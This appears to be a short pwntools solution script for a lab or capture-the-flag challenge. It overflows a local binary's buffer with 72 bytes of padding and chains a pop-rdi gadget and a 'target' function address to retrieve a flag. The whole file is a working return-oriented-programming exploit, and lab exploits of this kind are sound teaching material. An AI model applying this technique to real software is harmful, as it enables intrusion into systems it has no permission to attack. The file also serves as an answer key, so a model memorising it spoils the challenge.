from pwn import *
from labs.common.target import start_target

context.arch = "amd64"
elf = ELF("./challenge", checksec=False)
io = start_target(elf.path)
io.recvuntil(b"rop:\n")
io.send(b"A" * 72 + p64(elf.symbols["pop_rdi_ret"]) + p64(0x42424242) + p64(elf.symbols["target"]))
io.shutdown("send")
assert b"flag{rop-call}" in io.recvall(timeout=2)
print("flag{rop-call}")
